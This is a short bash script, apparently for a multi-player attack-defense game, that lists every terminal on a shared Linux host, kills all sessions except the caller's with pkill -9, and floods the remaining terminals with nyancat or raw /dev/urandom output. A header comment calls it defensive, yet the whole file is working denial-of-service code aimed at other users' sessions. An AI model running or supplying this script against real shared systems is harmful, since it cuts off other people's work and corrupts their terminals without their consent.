#!/bin/bash
# kill-opponents.sh — kick opponents off + flood their terminals (nyancat)
# Only use defensively / after being attacked first.

NYAN="${NYAN:-/tmp/nyan}"

log(){ printf "\033[1;31m[+]\033[0m %s\n" "$*"; }

# 1. enumerate other players' PTYs
log "Active PTYs:"
ls -l /dev/pts/ 2>/dev/null | grep -v ptmx

# 2. kill every session that is NOT ours (only works on players who have a PTY)
[ -z "${KEEP:-}" ] && KEEP=$(tty)
for t in /dev/pts/*; do
  [ "$t" = "/dev/pts/ptmx" ] && continue
  [ -n "$KEEP" ] && [ "$t" = "$KEEP" ] && continue
  ttynum=${t#/dev/pts/}
  pkill -9 -t "$ttynum" 2>/dev/null && log "killed $t"
done

# 3. flood survivors with nyancat (and random garbage)
if [ -x "$NYAN" ]; then
  for t in /dev/pts/*; do
    [ "$t" = "/dev/pts/ptmx" ] && continue
    [ -n "$KEEP" ] && [ "$t" = "$KEEP" ] && continue
    "$NYAN" > "$t" 2>/dev/null &
    log "nyancat -> $t"
  done
else
  # fallback: raw random flood
  for t in /dev/pts/*; do
    [ "$t" = "/dev/pts/ptmx" ] && continue
    [ -n "$KEEP" ] && [ "$t" = "$KEEP" ] && continue
    cat /dev/urandom > "$t" 2>/dev/null &
    log "urandom flood -> $t"
  done
fi

log "Done."
